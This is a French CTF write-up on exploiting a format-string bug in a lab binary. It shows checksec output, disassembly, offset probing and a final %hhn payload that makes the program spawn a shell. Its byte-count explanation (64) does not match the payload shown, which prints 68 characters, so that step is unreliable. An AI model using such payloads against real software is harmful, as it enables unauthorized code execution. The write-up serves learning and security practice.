# Level 3 - Format String Vulnerability Exploitation

## 📅 Objectif

Exploiter une vulnérabilité de type **Format String** pour écrire `0x40` à une adresse mémoire spécifique et déclencher un appel à `system("/bin/sh")`.

---

## 🔒 Analyse des protections

Commande :

```bash
checksec --file=./level3
```

Exemple de sortie :

```
RELRO           : No RELRO
Stack Canary    : No canary found
NX              : NX enabled
PIE             : No PIE
```

**Conclusion :**

* Pas de canary → possibilité d’attaque par la stack
* NX activé → injection de shellcode impossible, mais ret2libc possible
* Pas de PIE → adresses fixes utilisables directement

---

## 🔎 Reverse Engineering statique

### Fonction `main` :

```asm
0x0804851a <main>:
  call 0x80484a4 <v>
```

### Fonction `v` :

```asm
0x080484c7 <v+35>:  call fgets
0x080484d5 <v+49>:  call printf    ; vulnérabilité ici (pas de format)
0x080484da <v+54>:  mov 0x804988c, %eax
0x080484df <v+59>:  cmp $0x40, %eax
0x080484e2 <v+62>:  jne <skip>
...
0x08048513:  call system("/bin/sh")
```

**Conclusion :**

* L'entrée utilisateur est affichée directement avec `printf(input)`
* Si `*(int*)0x0804988c == 0x40`, on appelle `system()`

---

## 🚀 Exploitation

### ✅ Objectif : écrire `0x40` à `0x0804988c`

### 1. Trouver le bon offset

Payload test :

```bash
python2 -c 'print("\x8c\x98\x04\x08AAAA %1$p %2$p %3$p %4$p %5$p")'
```

Sortie :

```
0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x41414141
```

✅ Adresse ciblée est à la 4e position → on utilisera `%4$hhn`

### 2. Payload final

```bash
python2 -c 'print("\x8c\x98\x04\x08AAAA%60c%4$hhn")' | ./level3
```

**Explication :**

* `\x8c\x98\x04\x08` : adresse cible
* `AAAA` : padding (alignement)
* `%60c` : imprime 60 caractères
* `%4$hhn` : écrit le total (64) à `0x0804988c`

### 3. Résultat

```
Wait what?!
```

✅ La condition est réussie, le programme appelle `system("/bin/sh")`

---

## 💡 Résumé de la méthode

1. Analyser le code et repérer les appels à `printf(input)`
2. Identifier les variables importantes testées dans le code
3. Repérer les adresses fixes utiles (pas de PIE)
4. Trouver le bon offset avec `%x` ou `%p`
5. Construire le payload avec `%c` et `%X$hhn`
6. Injecter et vérifier l'effet (message, shell, etc.)

---

## 🔧 Améliorations possibles

* Ecriture multi-octets avec plusieurs `%hhn`
* Exploitation ret2libc si un retour est contrôlable
* Automatiser l’attaque avec un script Python (pwntools)

---

## 🏆 GG !

Tu as réussi une vraie attaque Format String sur un binaire vulnérable. Ce modèle est réutilisable pour d'autres challenges de CTF ou d'audit sécurité.
